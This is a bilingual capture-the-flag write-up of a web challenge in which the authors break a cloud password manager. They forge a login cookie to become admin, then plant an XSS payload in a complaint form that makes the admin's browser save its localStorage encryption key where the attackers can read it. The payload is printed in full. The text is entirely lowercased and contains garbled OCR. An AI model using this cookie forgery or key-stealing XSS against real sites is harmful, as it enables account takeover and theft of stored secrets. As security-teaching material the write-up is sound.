# cbpm (web 300)

###eng
[pl](#pl-version)

we get access to cloud-based password storage.
it stores encrypted passwords on the webpage, but the decryption key is present only on the client.

it is true - we check the local storage and there is a `key` entry:


[image extracted text: konsola
html
css
skrypt
dom
siec
ciasteczka
window
indexeddb
idbfactory
open_open() ,
deletedatabase_deletedatabase() ,
cmp_cmp()
innerheight
428
innerwidth
1536
issecurecontext
false
length
bocalstorage
przechowwane elementy:
key="niiihtolmknpjuvguujguuje
1tcrhnujutguujguujenw==
key
"nlilmtolmknpjuvguujgjuje
ivcrhnujuvguujgjujenw='
length]


we also notice that there is a cookie `logged_in_user` with our username.
we verify and apparently we can change it to anyone else, `admin` included.

`admin` user has an encrypted password called `flag`, but in order to decrypt it we would need admins `key` value from local storage.

there is a complaint form we can send to the admin, so we tried some standard xss on this and it didn't work.
the task description says that admin is using strong firewall, so we assumed that maybe admin can't reach anywhere outside.
but he should still be able to invoke local actions inside the system.

so we checked what kind of request is sent when we add new encrypted password in the system, and we prepared payload to add new encrypted password with `key` form local storage as label:

```
<script>
var xmlhttp = new xmlhttprequest();
xmlhttp.open("post", "/put.php");
xmlhttp.setrequestheader("content-type", "application/json");
xmlhttp.send(json.stringify({"id":"eyj0zwftawqioii3ntuifs4xy0lss1quq0dswklub3b6ajg4t0k2vjvobvqwlvq0avg4","prelabel":"","newlabel":localstorage.getitem('key'),"encpass":"1e4f3be4abf38a8b6650312361d2c9cc","iv":"e8831d7a2e67c5aa0012c6af3c064a2d"}));
</script>
```

and it worked!
after submitting this complaint form, there was a new password added to admins storage with name `vnlrv2rnwvneszjsymi1cwhnq2zxb2hqegtinuk2nkg=`.

now we could just put this into our local storage as `key` and decode the flag:

`sharifctf{eyj0ijoinzu1in0uq3plsxn3lkh6n21zngfmd0ztmvnwmuj1bmw2dlhqlvvxma==}`

###pl version

dostajemy dostęp do serwisu przechowującego hasła w chmurze.
serwis twierdzi przechowuje jedynie zaszyfrowane wersje haseł, a klucz deszyfrujący znajduje się jedynie u klienta.

faktycznie wygląda, że jest to prawda bo w local storage pojawił nam się `key`:


[image extracted text: konsola
html
css
skrypt
dom
siec
ciasteczka
window
indexeddb
idbfactory
open_open() ,
deletedatabase_deletedatabase() ,
cmp_cmp()
innerheight
428
innerwidth
1536
issecurecontext
false
length
bocalstorage
przechowwane elementy:
key="niiihtolmknpjuvguujguuje
1tcrhnujutguujguujenw==
key
"nlilmtolmknpjuvguujgjuje
ivcrhnujuvguujgjujenw='
length]


zauważmy także że jest cookie `logged_in_user` z naszym loginem.
okazuje się, że możemy zmienić tą wartość na dowolną inną, w tym na `admin`.

`admin` ma w swoim zbiorze przechowywanych haseł takie o nazwie `flag`, ale żeby je odczytać musielibyśmy poznać `key` z local storage admina.

w serwisie jest formularz skarg który można wysłać adminowi, więc najpierw próbowaliśmy standardowych xssów, ale bez efektów.
w opisie zadania była informacja że admin używa mocnego firewalla, więc uznaliśmy, że admin może nie mieć wyjścia na zewnątrz.
mimo wszystko powinien móc wykonywać akcje wewnątrz systemu.

sprawdziliśmy więc jakie requesty są wysyłane, żeby dodać nowe hasło przechowalni w systemie i przygotowalimy payload xss tak żeby admin dodał sobie nowe hasło z wartością `key` z local storage jako nazwą:

```
<script>
var xmlhttp = new xmlhttprequest();
xmlhttp.open("post", "/put.php");
xmlhttp.setrequestheader("content-type", "application/json");
xmlhttp.send(json.stringify({"id":"eyj0zwftawqioii3ntuifs4xy0lss1quq0dswklub3b6ajg4t0k2vjvobvqwlvq0avg4","prelabel":"","newlabel":localstorage.getitem('key'),"encpass":"1e4f3be4abf38a8b6650312361d2c9cc","iv":"e8831d7a2e67c5aa0012c6af3c064a2d"}));
</script>
```

i zadziałało!
po wysłaniu formularza skargi z tym kodem, u admina pojawiło się nowe hasło o nazwie: `vnlrv2rnwvneszjsymi1cwhnq2zxb2hqegtinuk2nkg=`.

mogliśmy teraz podmienić nasze lokalne `key` na hasło admina w local storage i zdekodować flagę:

`sharifctf{eyj0ijoinzu1in0uq3plsxn3lkh6n21zngfmd0ztmvnwmuj1bmw2dlhqlvvxma==}`
